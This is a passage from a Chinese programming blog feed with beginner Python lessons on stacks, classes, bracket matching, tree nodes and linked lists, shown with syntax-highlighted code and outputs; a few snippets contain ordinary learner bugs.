class="built_in">int</span></span>):</span><br><span class="line">    last = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(persons) &gt; <span class="number">1</span>:</span><br><span class="line">        last += step</span><br><span class="line">        last = last % <span class="built_in">len</span>(persons)</span><br><span class="line">        <span class="keyword">del</span> persons[last]</span><br><span class="line">    <span class="keyword">return</span> persons[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(game(<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>), <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">=== Output ===</span></span><br><span class="line"><span class="string">A</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="链表与二叉树"><a href="#链表与二叉树" class="headerlink" title="链表与二叉树"></a>链表与二叉树</h2><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph TD;1--&gt;2;1--&gt;3;1--&gt;4;3--&gt;5;3--&gt;6;3--&gt;7;4--&gt;8;4--&gt;9;7--&gt;10;7--&gt;11;11--&gt;12;  </pre></div><p>如图，用链表模拟二叉树</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value, <span class="built_in">next</span>=<span class="literal">None</span></span>):</span><br><span class="line">        self.value = value</span><br><span class="line">        self.childs = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">depth</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.childs: <span class="comment"># 没有孩子节点</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">max</span>([node.depth() <span class="keyword">for</span> node <span class="keyword">in</span> self.childs])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">iter_depth</span>(<span class="params">self</span>):   <span class="comment"># 深度优先</span></span><br><span class="line">        items = []</span><br><span class="line">        items.append(self.value)</span><br><span class="line">        <span class="keyword">for</span> child <span class="keyword">in</span> self.childs:</span><br><span class="line">            items.extend(child.iter_depth())</span><br><span class="line">        <span class="keyword">return</span> items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">iter_width</span>(<span class="params">self</span>):   <span class="comment"># 广度优先</span></span><br><span class="line">        items = [self.value]</span><br><span class="line">        <span class="keyword">for</span> child <span class="keyword">in</span> self.childs:</span><br><span class="line">            items.extend(child.iter_width())</span><br><span class="line">        <span class="keyword">return</span> items</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = Node(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">5</span>):</span><br><span class="line">    root.childs.append(Node(i))</span><br><span class="line"></span><br><span class="line">node: Node = root.childs[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">8</span>):</span><br><span class="line">    node.childs.append(i)</span><br><span class="line"></span><br><span class="line">node = root.childs[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">10</span>):</span><br><span class="line">    node.childs.append(i)</span><br><span class="line"></span><br><span class="line">node = root.childs[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">12</span>):</span><br><span class="line">    node.childs.append(i)</span><br><span class="line"></span><br><span class="line">node = node[<span class="number">1</span>]</span><br><span class="line">node.childs.append(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始的Python ACM Ch.2：时间复杂度、栈、面向对象及链表</title>
      <link href="/posts/Go-for-Python-Ch2/"/>
      <url>/posts/Go-for-Python-Ch2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="列表与字典的时间复杂度"><a href="#列表与字典的时间复杂度" class="headerlink" title="列表与字典的时间复杂度"></a>列表与字典的时间复杂度</h2><p>列表的<code>ls.append()</code>复杂度是<code>O(n)</code>，字典的插入<code>dt[&#39;key&#39;] = value</code>的复杂度是<code>O(1)</code>。Python自带的字典排序<code>ls.sort()</code>复杂度是<code>O(nlogn)</code>（这个排序算法是用C语言写的，基本上自己在Python里面写的排序算法都没有它快</p><h2 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈(Stack)"></a>栈(Stack)</h2><p>基本操作：</p><ul><li>压栈<code>stack.append(element)</code></li><li>出栈    <code>del stack[-1]</code></li><li>判断是否为空    <code>len(stack) == 0</code></li></ul><h2 id="面向对象的Python编程"><a href="#面向对象的Python编程" class="headerlink" title="面向对象的Python编程"></a>面向对象的Python编程</h2><p>以栈对象为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):<span class="comment"># 构造类里面的函数，在每次实例化的同时会自动调用__init__函数</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.summary = x + y</span><br><span class="line">s = Stack(<span class="number">3</span>, <span class="number">4</span>)<span class="comment"># 得到一个Stack类型的实例（实例化）</span></span><br><span class="line"><span class="built_in">print</span>(s.x, s.y, s.summary)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">=== Output ===</span></span><br><span class="line"><span class="string">3 4 7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>更深一步，在对象里面定义对象的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):<span class="comment"># 构造类里面的函数，在每次实例化的同时会自动调用__init__函数</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">summary</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.x + self.y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line">        self.b = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = Stack(<span class="number">3</span>, <span class="number">4</span>)  <span class="comment"># 得到一个Stack类型的实例（实例化）</span></span><br><span class="line"><span class="built_in">print</span>(s.summary())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">=== Output ===</span></span><br><span class="line"><span class="string">7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>创建一个类型<code>Rect</code>（矩形），能执行以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r1 = Rect(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(r1.width)<span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(r1.height)<span class="comment"># 20</span></span><br><span class="line"><span class="built_in">print</span>(r1.area())<span class="comment"># 200</span></span><br><span class="line"><span class="built_in">print</span>(r1.length())<span class="comment"># 60</span></span><br><span class="line"></span><br><span class="line">r2 = Rect(<span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(r2.area())</span><br></pre></td></tr></table></figure><p>我的题解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Rect</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width, height</span>):</span><br><span class="line">        self.width = width</span><br><span class="line">        self.height = height</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">area</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.width * self.height</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">length</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (self.width + self.height) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r1 = Rect(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(r1.width)<span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(r1.height)  <span class="comment"># 20</span></span><br><span class="line"><span class="built_in">print</span>(r1.area())  <span class="comment"># 200</span></span><br><span class="line"><span class="built_in">print</span>(r1.length())  <span class="comment"># 60</span></span><br><span class="line"></span><br><span class="line">r2 = Rect(<span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(r2.area())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">=== Output ===</span></span><br><span class="line"><span class="string">10</span></span><br><span class="line"><span class="string">20</span></span><br><span class="line"><span class="string">200</span></span><br><span class="line"><span class="string">60</span></span><br><span class="line"><span class="string">30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="例题：使用列表模拟栈"><a href="#例题：使用列表模拟栈" class="headerlink" title="例题：使用列表模拟栈"></a>例题：使用列表模拟栈</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enquen</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.data.append(value)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequen</span>(<span class="params">self</span>):</span><br><span class="line">        value = self.data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> self.data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEnpty</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.data) == <span class="number">0</span></span><br></pre></td></tr></table></figure><p>对栈进行操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enquen</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.data.append(value)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequen</span>(<span class="params">self</span>):</span><br><span class="line">        value = self.data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> self.data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.data) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    stack = Stack()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        stack.enquen(random.randint(<span class="number">0</span>,<span class="number">100</span>))</span><br><span class="line">    <span class="built_in">print</span>(stack.data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        value = stack.dequen()</span><br><span class="line">        <span class="built_in">print</span>(value, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(stack.data)</span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">=== Output ===</span></span><br><span class="line"><span class="string">[3, 88, 78, 41, 28, 81, 33, 91, 86, 17, 57, 39, 17, 17, 98, 69, 65, 86, 83, 60, 67, 10, 95, 8, 66, 37, 10, 64, 41, 79, 39, 57, 32, 44, 62, 28, 32, 75, 41, 42, 87, 8, 7, 82, 85, 54, 2, 13, 96, 70, 1, 25, 47, 10, 75, 29, 92, 60, 29, 73, 24, 76, 5, 70, 62, 5, 85, 54, 25, 44, 37, 53, 11, 39, 25, 67, 37, 6, 99, 58, 97, 33, 26, 35, 50, 73, 48, 49, 16, 89, 2, 86, 28, 10, 89, 91, 1, 81, 9, 26]</span></span><br><span class="line"><span class="string">26 9 81 1 91 89 10 28 86 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[3, 88, 78, 41, 28, 81, 33, 91, 86, 17, 57, 39, 17, 17, 98, 69, 65, 86, 83, 60, 67, 10, 95, 8, 66, 37, 10, 64, 41, 79, 39, 57, 32, 44, 62, 28, 32, 75, 41, 42, 87, 8, 7, 82, 85, 54, 2, 13, 96, 70, 1, 25, 47, 10, 75, 29, 92, 60, 29, 73, 24, 76, 5, 70, 62, 5, 85, 54, 25, 44, 37, 53, 11, 39, 25, 67, 37, 6, 99, 58, 97, 33, 26, 35, 50, 73, 48, 49, 16, 89]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="例题：匹配括号"><a href="#例题：匹配括号" class="headerlink" title="例题：匹配括号"></a>例题：匹配括号</h3><p>已知一串由小括号<code>(</code> <code>)</code>组成的字符串，试判断该字符串中的括号组合是否合法</p><p>我的题解（时间复杂度<code>O(n^2)</code>，因为<code>replace</code>要先查找再替换，进行了两次遍历：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s = ()()()(((())))))()</span><br><span class="line">result = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;()&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> s:</span><br><span class="line">        result = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">0</span>:</span><br><span class="line">        result = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    s.replace(<span class="string">&#x27;()&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>优化版（利用栈的特性）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enquen</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.data.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequen</span>(<span class="params">self</span>):</span><br><span class="line">        value = self.data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> self.data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.data) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;()()()(((())))))()&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result=-<span class="number">1</span></span><br><span class="line">    stack=Stack()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            stack.enquen(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> stack.isEmpty():</span><br><span class="line">                result=<span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            stack.dequen()</span><br><span class="line">        result=stack.isEmpty()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="例题：匹配括号（升级版）"><a href="#例题：匹配括号（升级版）" class="headerlink" title="例题：匹配括号（升级版）"></a>例题：匹配括号（升级版）</h3><p>在上一题的基础上，括号不只有小括号了，还有中括号<code>[]</code>和花括号<code>&#123;&#125;</code>，同样判断括号对是否合法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enquen</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.data.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dequen</span>(<span class="params">self</span>):</span><br><span class="line">        value = self.data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> self.data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.data) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;()(((()))))))&#123;&#123;&#125;&#125;&#125;&#125;[[]]]]]])&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result = -<span class="number">1</span></span><br><span class="line">    stack = Stack()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&quot;([&#123;&quot;</span>:</span><br><span class="line">            stack.enquen(c)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> stack.isEmpty():</span><br><span class="line">                result = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            value = stack.dequen()</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span> <span class="keyword">and</span> value == <span class="string">&#x27;(&#x27;</span>) <span class="keyword">or</span> (c == <span class="string">&#x27;]&#x27;</span> <span class="keyword">and</span> value == <span class="string">&#x27;[&#x27;</span>) <span class="keyword">or</span> (c == <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">and</span> value == <span class="string">&#x27;&#123;&#x27;</span>):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        result = stack.isEmpty()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="all-x2F-any-的用法"><a href="#all-x2F-any-的用法" class="headerlink" title="all()&#x2F;any()的用法"></a>all()&#x2F;any()的用法</h2><p>官方说明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">all()</span><br><span class="line"></span><br><span class="line">Return True if bool(x) is True for all values x in the iterable.</span><br><span class="line"></span><br><span class="line">If the iterable is empty, return True.</span><br><span class="line"></span><br><span class="line">=========================================================================</span><br><span class="line"></span><br><span class="line">any()</span><br><span class="line"></span><br><span class="line">Return True if bool(x) is True for any x in the iterable.</span><br><span class="line"></span><br><span class="line">If the iterable is empty, return False.</span><br></pre></td></tr></table></figure><p>应用举例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dt = &#123;<span class="number">1</span>: <span class="number">0</span>, <span class="number">2</span>: <span class="number">0</span>, <span class="number">3</span>: <span class="number">1</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(dt.values()))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">any</span>(dt.values()))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">=== Output ===</span></span><br><span class="line"><span class="string">False</span></span><br><span class="line"><span class="string">True</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>因为字典里面不全是<code>1</code>，在Python里面，<code>1</code>代表<code>True</code>，不全为<code>1</code>所以为<code>False</code>，但是对于<code>any</code>函数，里面一旦出现了<code>True</code>就返回<code>True</code>，所以这里是<code>True</code></p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p>链表里面的基本单位是<code>结点(node)</code>，单链表只存储值和下一节点的位置，双链表保存到一个上一节点的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:<span class="comment"># 单链表</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value, <span class="built_in">next</span></span>):</span><br><span class="line">        self.value = value</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="built_in">next</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:<span class="comment"># 双链表</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value, prev, <span class="built_in">next</span></span>):</span><br><span class="line">        self.value = value</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="built_in">next</span></span><br><span class="line">        self.prev = prev</span><br></pre></td></tr></table></figure><h3 id="用双链表模拟栈"><a href="#用双链表模拟栈" class="headerlink" title="用双链表模拟栈"></a>用双链表模拟栈</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 